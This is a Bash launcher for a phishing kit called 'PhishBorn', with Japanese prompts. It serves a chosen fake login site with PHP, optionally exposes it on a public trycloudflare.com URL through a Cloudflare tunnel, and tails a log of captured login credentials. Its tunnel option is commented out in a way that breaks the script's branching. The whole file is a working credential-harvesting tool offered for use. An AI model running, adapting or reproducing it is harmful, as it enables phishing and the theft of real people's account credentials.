#!/bin/bash

cd "$(dirname "$0")"
site_dir="site"


RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
NC='\033[0m' 

clear

echo -e 
sleep 0.5
echo -e "     ${ORANGE}[${NC}-${ORANGE}]${NC}PhishBorn by tajitag"
echo ""


folders=()
for dir in "$site_dir"/*/; do
  if [ -f "${dir}index.php" ]; then
    folders+=("$(basename "$dir")")
  fi
done

if [ ${#folders[@]} -eq 0 ]; then
  echo -e "${RED}エラー：index.php を含むフォルダが見つかりません${NC}"
  exit 1
fi



echo -e "${ORANGE}[${NC}-${ORANGE}]${NC} ${GREEN}起動するサイトを選んでください：${NC}"
for i in "${!folders[@]}"; do
  echo -e "${ORANGE}[${NC}${YELLOW}$((i+1))${NC}${ORANGE}]${NC} ${folders[$i]}"
done
echo -e "${ORANGE}[${NC}${YELLOW}0${NC}${ORANGE}]${NC} 終了"
echo ""


read -p "番号を入力 >>> " choice


if [[ "$choice" == "0" ]]; then
  echo -e "${RED}終了します。${NC}"
  exit 0
elif [[ "$choice" -gt 0 && "$choice" -le ${#folders[@]} ]]; then
  selected="${folders[$((choice-1))]}"
  echo -e "${BLUE}${selected} を選択しました${NC}"
  cd "$site_dir/$selected"

clear

  echo ""
  echo -e "${ORANGE}[${NC}-${ORANGE}]${NC} 公開方法を選んでください："
  echo -e "${ORANGE}[${NC}1${ORANGE}]${NC} ローカルホスト（http://localhost:8000）"
 ## 以下の行のコードは悪用しないことを認めてかつDiscord上で制作者に許可をもらったときのみコメントアウトを解除してしようしてください。
 ## echo -e "${ORANGE}[${NC}2${ORANGE}]${NC} Cloudflared使用"

  echo ""
  read -p "番号を入力 >>> " method

  > log.txt
 clear
  if [[ "$method" == "1" ]]; then
    echo -e "ローカルホストで起動します"
    php -S localhost:8000 > /dev/null 2>&1 &
    server_pid=$!
    sleep 1
    echo -e "ログイン情報を監視中（Ctrl+Cで終了）:(http://localhost:8000/index.php)"
    tail -f log.txt
    kill $server_pid

   ## elif [[ "$method" == "2" ]]; then
    if ! command -v cloudflared > /dev/null; then
      echo -e "${RED}Cloudflared が見つかりません。インストールしてください。${NC}"
      exit 1
    fi
    echo -e "Cloudflaredで仮想サーバーを起動します"
    php -S localhost:8000 > /dev/null 2>&1 &
    server_pid=$!
    sleep 2
    cloudflared tunnel --url http://localhost:8000 > cloudflared.log 2>&1 &
    tunnel_pid=$!
    sleep 4
    clear
    public_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare\.com' cloudflared.log | head -n 1)
    echo -e "公開URL：$public_url"
    echo -e "ログイン情報を監視中（Ctrl+Cで終了）:"
    tail -f log.txt
    kill $server_pid
    kill $tunnel_pid

  else
    echo -e "${RED}無効な入力です。最初からやり直してください。${NC}"
  fi
else
  echo -e "${RED}無効な入力です。${NC}"
fi
